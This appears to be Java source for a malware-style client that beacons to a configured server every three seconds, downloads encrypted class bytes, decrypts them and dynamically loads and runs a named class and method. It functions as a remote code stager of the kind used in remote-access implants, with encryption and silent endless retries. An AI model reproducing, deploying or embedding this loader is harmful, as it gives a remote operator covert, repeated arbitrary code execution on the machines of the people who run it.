import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.concurrent.*;
import java.net.*;

public class Client {

    private final int REFRESH = 3; // secs
    private final int RETRY = 3; // secs
    private static Client inst = null;

    private Socket socket = null;

    Encryption cipher = null;

    private Settings settings = Settings.getInstance();


    public Client() {
    }

    public static Client getInstance() {
        if (inst == null)
            inst = new Client();

        return inst;
    }

    public void run() {

        cipher = settings.getKey() == null ? new Encryption() : new Encryption(settings.getKey());

        // Schedule worker to run every X seconds
        ScheduledExecutorService scheduler =
                Executors.newScheduledThreadPool(1);

        ScheduledFuture<?> periodicTask =
                scheduler.scheduleAtFixedRate(new ClientWorker(), 1, REFRESH, TimeUnit.SECONDS);

        // Cancel worker
        //Runnable killer = () -> periodicTask.cancel(false);
        //scheduler.schedule(killer, 1, TimeUnit.HOURS);
    }


    class ClientWorker implements Runnable {

        @Override
        public void run() {

            try {

                // Retry if connecting to server fails
                while(socket == null) {
                    //while (!socket.isConnected()) {
                        try {
                            socket = new Socket(settings.getAddress(), settings.getPort());
                        } catch (IOException ex) {
                            System.err.println(String.format("Error connecting to server %s:%d. Retrying in %d seconds...",
                                    settings.getAddress(), settings.getPort(), RETRY));
                            try {
                                Thread.sleep(RETRY * 1000);
                            } catch (InterruptedException ex2) {
                                throw new RuntimeException(ex2);
                            }
                            //throw new RuntimeException(e);
                        }
                   // }
                }


                InputStream inpStream = socket.getInputStream();
                OutputStream outStream = socket.getOutputStream();

                byte[] classBytes = cipher.decrypt(inpStream.readAllBytes());
                LoadClass loader = new LoadClass(settings.getClassName(),
                        settings.getClassMethod(),
                        classBytes);

                loader.load();

                inpStream.close();
                outStream.close();

                socket.close();
                socket = null;

            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }

        }
    }
}
